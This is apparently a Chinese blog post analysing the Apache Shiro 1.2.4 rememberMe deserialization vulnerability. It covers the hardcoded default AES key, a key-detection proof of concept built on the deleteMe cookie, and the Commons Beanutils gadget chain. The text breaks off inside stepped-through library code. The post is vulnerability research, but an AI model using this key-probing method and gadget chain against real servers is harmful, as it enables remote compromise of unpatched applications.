+<p>shiro：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/apache/shiro.git</span></span><br><span class="line">cd shiro</span><br><span class="line"><span class="comment">//切换到1.2.4版本</span></span><br><span class="line">git checkout shiro-root-<span class="number">1.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure>
+
+<p><em>注意：修改shiro/samples/web目录下的pom.xml，将jstl的版本修改为1.2</em></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ieda配置tomcat：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1V54y1q7Qj">https://www.bilibili.com/video/BV1V54y1q7Qj</a></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="rememberMe加密生成过程"><a href="#rememberMe加密生成过程" class="headerlink" title="rememberMe加密生成过程"></a>rememberMe加密生成过程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">调用过程：</span><br><span class="line">DefaultSecurityManager.login()-&gt;</span><br><span class="line">DefaultSecurityManager.onSuccessfulLogin()-&gt;</span><br><span class="line">DefaultSecurityManager.rememberMeSuccessfulLogin()-&gt;</span><br><span class="line">	AbstractRememberMeManager.onSuccessfulLogin()-&gt;</span><br><span class="line">		CookieRememberMeManager.forgetIdentity(Subject subject)-&gt;</span><br><span class="line">			WebUtils.getHttpRequest()-&gt;</span><br><span class="line">			WebUtils.getHttpResponse()-&gt;</span><br><span class="line">		CookieRememberMeManager.forgetIdentity(HttpServletRequest request, HttpServletResponse response)-&gt;</span><br><span class="line">			CookieRememberMeManager.getCookie()-&gt;</span><br><span class="line">				SimpleCookie.removeFrom()-&gt;</span><br><span class="line">		AbstractRememberMeManager.rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)-&gt;</span><br><span class="line">		AbstractRememberMeManager.rememberIdentity(Subject subject, PrincipalCollection accountPrincipals)-&gt;</span><br><span class="line">			AbstractRememberMeManager.convertPrincipalsToBytes()-&gt;</span><br><span class="line">    				AbstractRememberMeManager.serialize()-&gt;<span class="comment">//对用户对象进行序列化</span></span><br><span class="line">				AbstractRememberMeManager.encrypt()-&gt;<span class="comment">//对序列化用户对象的字节数组进行加密</span></span><br><span class="line">			CookieRememberMeManager.rememberSerializedIdentity()<span class="comment">//对加密的字节数组进行base64编码，保存在cookie中。</span></span><br></pre></td></tr></table></figure>
+
+<p>org/apache/shiro/mgt/DefaultSecurityManager.java的login下断点，login方法调用了onSuccessfulLogin方法，onSuccessfulLogin方法调用rememberMeSuccessfulLogin方法，rememberMeSuccessfulLogin方法调用AbstractRememberMeManager.onSuccessfulLogin方法。</p>
+<p><img src="image-20220109153616218.png" alt="image-20220109153616218"></p>
+<p><img src="image-20220109154503276.png" alt="image-20220109154503276"></p>
+<p><img src="image-20220109154807513.png" alt="image-20220109154807513"></p>
+<p>AbstractRememberMeManager.onSuccessfulLogin方法调用CookieRememberMeManager.forgetIdentity方法，forgetIdentity方法会先获取请求和响应包，调用getCookie获取请求的cookie，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe</p>
+<p><img src="image-20220109160926929.png" alt="image-20220109160926929"></p>
+<p>然后再回到onSuccessfulLogin方法中，如果设置rememberMe则进入rememberIdentity。</p>
+<p><img src="image-20220109161050166.png" alt="image-20220109161050166"></p>
+<p>rememberIdentity调用convertPrincipalsToBytes方法</p>
+<p><img src="image-20220109161502178.png" alt="image-20220109161502178"></p>
+<p>进入convertPrincipalsToBytes方法，先对用户对象进行序列化，然后对序列化的数据进行加密，跟进encrypt方法。加密算法为AES，模式为CBC，填充算法为PKCS5Padding。</p>
+<p><img src="image-20220109224922086.png" alt="image-20220109224922086"></p>
+<p><img src="image-20220109162152036.png" alt="image-20220109162152036"></p>
+<p>调用getEncryptionCipherKey获取加密密钥，在Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==</p>
+<p><img src="image-20220109162621482.png" alt="image-20220109162621482"></p>
+<p>加密完成返回，接着调用CookieRememberMeManager.rememberSerializedIdentity方法</p>
+<p><img src="image-20220109162835773.png" alt="image-20220109162835773"></p>
+<p>跟进CookieRememberMeManager.rememberSerializedIdentity方法，对加密的字节数组进行base64编码，保存在cookie中。</p>
+<p><img src="image-20220109163144859.png" alt="image-20220109163144859"></p>
+<p><img src="image-20220109163445198.png" alt="image-20220109163445198"></p>
+<h4 id="rememberMe解密反序列化过程"><a href="#rememberMe解密反序列化过程" class="headerlink" title="rememberMe解密反序列化过程"></a>rememberMe解密反序列化过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">调用过程：</span><br><span class="line">DefaultSecurityManager.resolvePrincipals()-&gt;</span><br><span class="line">DefaultSecurityManager.getRememberedIdentity()-&gt;</span><br><span class="line">	AbstractRememberMeManager.getRememberedPrincipals()-&gt;</span><br><span class="line">		CookieRememberMeManager.getRememberedSerializedIdentity()-&gt;</span><br><span class="line">		AbstractRememberMeManager.convertBytesToPrincipals()-&gt;</span><br><span class="line">			AbstractRememberMeManager.decrypt()-&gt;</span><br><span class="line">			AbstractRememberMeManager.deserialize()-&gt;</span><br><span class="line">				DefaultSerializer.deserialize()</span><br></pre></td></tr></table></figure>
+
+<p>在DefaultSecurityManager.resolvePrincipals方法下断点，</p>
+<p><img src="image-20220109215238024.png" alt="image-20220109215238024"></p>
+<p>resolvePrincipals方法调用getRememberedIdentity方法，跟进getRememberedIdentity方法。</p>
+<p><img src="image-20220109215347456.png" alt="image-20220109215347456"></p>
+<p>getRememberedIdentity方法调用AbstractRememberMeManager.getRememberedPrincipals方法，跟进getRememberedPrincipals方法。</p>
+<p><img src="image-20220109220323439.png" alt="image-20220109220323439"></p>
+<p>getRememberedPrincipals方法调用CookieRememberMeManager.getRememberedSerializedIdentity方法，跟进getRememberedSerializedIdentity方法。获取序列化的凭证，从请求中获取 Cookie 中的 rememberMe 并进⾏ base64 解码，解码后内容为AES加密内容字节数组并返回给bytes字节数组。</p>
+<p><img src="image-20220109220549216.png" alt="image-20220109220549216"></p>
+<p><img src="image-20220109220714584.png" alt="image-20220109220714584"></p>
+<p>回到getRememberedPrincipals方法，调用convertBytesToPrincipals 方法，将解码的内容传⼊ convertBytesToPrincipals 进⾏ AES 解密和反序列化，调⽤ decrypt 方法进⾏AES解密</p>
+<p><img src="image-20220109221630355.png" alt="image-20220109221630355"></p>
+<p>跟进decrypt方法，getDecryptionCipherKey方法获取密钥(Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==)，进行解密，最后返回解密完成后序列化对象的字节数组。</p>
+<p><img src="image-20220109222042654.png" alt="image-20220109222042654"></p>
+<p>回到convertBytesToPrincipals方法，调用deserialize方法，跟进deserialize方法。</p>
+<p><img src="image-20220109222517214.png" alt="image-20220109222517214"></p>
+<p>先调用getSerializer方法获取DefaultSerializer对象，调用DefaultSerializer对象的deserialize方法，跟进DefaultSerializer.deserialize方法。通过字节输入流将其反序列化，至此rememberMe解密反序列化过程结束。</p>
+<p><img src="image-20220109222842187.png" alt="image-20220109222842187"></p>
+<h3 id="shiro检测"><a href="#shiro检测" class="headerlink" title="shiro检测"></a>shiro检测</h3><p>shiro-550检测就两点，一是key，二是Gadget chain。虽然≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA==，官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key，所以在检测漏洞时我们需要先确定密钥。</p>
+<p>参考：<a target="_blank" rel="noopener" href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">一种另类的shiro检测方式</a></p>
+<p>通过是否返回rememberMe=deleteMe判断key的正确性</p>
+<p>我们回到解密过程的AbstractRememberMeManager.getRememberedPrincipals方法的convertBytesToPrincipals方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PrincipalCollection <span class="title">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    PrincipalCollection principals = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="keyword">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = <span class="keyword">this</span>.convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var4) &#123;</span><br><span class="line">        principals = <span class="keyword">this</span>.onRememberedPrincipalFailure(var4, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">		bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用decrypt方法进行解密，当key错误的时候解密失败，就会抛出异常，getRememberedPrincipals方法就会捕获异常，调用onRememberedPrincipalFailure方法，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">onRememberedPrincipalFailure</span><span class="params">(RuntimeException e, SubjectContext context)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">		log.debug(<span class="string">&quot;There was a failure while trying to retrieve remembered principals.  This could be due to a configuration problem or corrupted principals.  This could also be due to a recently changed encryption key.  The remembered identity will be forgotten and not used for this request.&quot;</span>, e);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">this</span>.forgetIdentity(context);</span><br><span class="line">	<span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>onRememberedPrincipalFailure方法调用forgetIdentity方法，forgetIdentity方法在前面加密过程中有提到，调用SimpleCookie.removeFrom方法在response头部添加Set-Cookie: rememberMe=deleteMe，当我们key错误的时候会返回rememberMe=deleteMe，这是一种情况。</p>
+<p><img src="image-20220109160926929.png" alt="image-20220109160926929"></p>
+<p>还有一种情况，用反序列化 gadget 生成之后，拿shiro加密算法进行加密，但是最后依然在 response里面携带了rememberMe=deleteMe。</p>
+<p>还是回到 AbstractRememberMeManager.convertBytesToPrincipals方法当中，这里的key肯定是正确的，所以经过 decrypt处理之后返回 bytes数组，调用deserialize方法，跟进deserialize方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] serializedIdentity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (PrincipalCollection)<span class="keyword">this</span>.getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化的 gadget 实际上并不是继承了 PrincipalCollection ，所以这里进行类型转换会报错。在做类型转换之前，先进入了 DefaultSerializer#deserialize 进行反序列化处理，等处理结束返回 deserialized 时候，进行类型转换自然又回到了上面提到的类型转换异常，我们 key 不正确的情况下的 catch 异常捕获的逻辑里，后面的流程就和上述一样了。</p>
+<p>结合以上两种情况，只需要满足两点：</p>
+<p>1.构造一个继承 PrincipalCollection 的序列化对象。</p>
+<p>2.key正确情况下不返回 deleteMe ，key错误情况下返回 deleteMe 。</p>
+<p>基于这两个条件下 SimplePrincipalCollection 这个类自然就出现了，这个类可被序列化，继承了 PrincipalCollection 。</p>
+<p><img src="image-20220110201227719.png" alt="image-20220110201227719"></p>
+<p>构造POC实际上也很简单，构造一个这个空对象也是可以达到效果的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SimplePrincipalCollection simplePrincipalCollection = <span class="keyword">new</span> SimplePrincipalCollection();</span><br><span class="line">ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload&quot;</span>));</span><br><span class="line">obj.writeObject(simplePrincipalCollection);</span><br><span class="line">obj.close();</span><br></pre></td></tr></table></figure>
+
+<h3 id="Commons-Beanutils反序列化"><a href="#Commons-Beanutils反序列化" class="headerlink" title="Commons Beanutils反序列化"></a>Commons Beanutils反序列化</h3><p><strong>Gadget chain:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">    PriorityQueue.siftDown()</span><br><span class="line">    PriorityQueue.siftDownUsingComparator()</span><br><span class="line">	BeanComparator.compare()</span><br><span class="line">            TemplatesImpl.getOutputProperties()</span><br><span class="line">            TemplatesImpl.newTransformer()</span><br><span class="line">            TemplatesImpl.getTransletInstance()</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">            TemplatesImpl.defineClass()</span><br></pre></td></tr></table></figure>
+
+<p>首先我们需要了解Commons Beanutils是干什么的，Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。</p>
+<p>例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;miao~ miao~&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。</p>
+<p>commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以动态调用任意JavaBean的getter方法</p>
+<p>例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Cat cat = <span class="keyword">new</span> Cat();</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(cat,<span class="string">&quot;name&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220110210953428.png" alt="image-20220110210953428"></p>
+<p>调试看看getProperty做了一些什么。</p>
+<p>进入PropertyUtils.getProperty，调用PropertyUtilsBean.getProperty方法，跟进继续调用PropertyUtilsBean.getNestedProperty方法，继续跟进。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getNestedProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bean == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;No bean specified&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;No name specified for bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">this</span>.resolver.hasNested(name)) &#123;</span><br><span class="line">                String next = <span class="keyword">this</span>.resolver.next(name);</span><br><span class="line">                Object nestedBean = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">                    nestedBean = <span class="keyword">this</span>.getPropertyOfMapBean((Map)bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.resolver.isMapped(next)) &#123;</span><br><span class="line">                    nestedBean = <span class="keyword">this</span>.getMappedProperty(bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.resolver.isIndexed(next)) &#123;</span><br><span class="line">                    nestedBean = <span class="keyword">this</span>.getIndexedProperty(bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    nestedBean = <span class="keyword">this</span>.getSimpleProperty(bean, next);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (nestedBean == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> NestedNullException(<span class="string">&quot;Null property value for &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                bean = nestedBean;</span><br><span class="line">                name = <span class="keyword">this</span>.resolver.remove(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">                bean = <span class="keyword">this</span>.getPropertyOfMapBean((Map)bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.resolver.isMapped(name)) &#123;</span><br><span class="line">                bean = <span class="keyword">this</span>.getMappedProperty(bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.resolver.isIndexed(name)) &#123;</span><br><span class="line">                bean = <span class="keyword">this</span>.getIndexedProperty(bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bean = <span class="keyword">this</span>.getSimpleProperty(bean, name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bean;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过一系列判断，最后调用getSimpleProperty方法，继续跟进。</p>
+<p><img src="image-20220110212327108.png" alt="image-20220110212327108"></p>
+<p>又是一系列判断，最后调用getPropertyDescriptor方法，这个方法检索指定 bean 的指定属性的属性描述符，其中就会返回getter方法和setter方法。</p>
+<p><img src="image-20220110212450494.png" alt="image-20220110212450494"></p>
+<p><img src="image-20220110214247138.png" alt="image-20220110214247138"></p>
+<p>然后通过反射获取getter方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Method <span class="title">getReadMethod</span><span class="params">(Class clazz, PropertyDescriptor descriptor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> MethodUtils.getAccessibleMethod(clazz, descriptor.getReadMethod());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220110214341155.png" alt="image-20220110214341155"></p>
+<p>再invoke调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeMethod</span><span class="params">(Method method, Object bean, Object[] values)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bean == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;No bean specified - this should have been checked before reaching this method&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String valueString;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        Class[] parTypes;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        String expectedString;</span><br><span class="line">        IllegalArgumentException e;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(bean, values);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException var9) &#123;</span><br><span class="line">            valueString = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (values != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; values.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        valueString = valueString + <span class="string">&quot;, &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (values[i] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        valueString = valueString + <span class="string">&quot;&lt;null&gt;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        valueString = valueString + values[i].getClass().getName();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expectedString = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            parTypes = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">if</span> (parTypes != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; parTypes.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        expectedString = expectedString + <span class="string">&quot;, &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    expectedString = expectedString + parTypes[i].getName();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e = <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Cannot invoke &quot;</span> + method.getDeclaringClass().getName() + <span class="string">&quot;.&quot;</span> + method.getName() + <span class="string">&quot; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27; - &quot;</span> + var9.getMessage() + <span class="string">&quot; - had objects of type \&quot;&quot;</span> + valueString + <span class="string">&quot;\&quot; but expected signature \&quot;&quot;</span> + expectedString + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!BeanUtils.initCause(e, var9)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.log.error(<span class="string">&quot;Method invocation failed&quot;</span>, var9);</span><br><span class="line">            &#125;</span><br><span 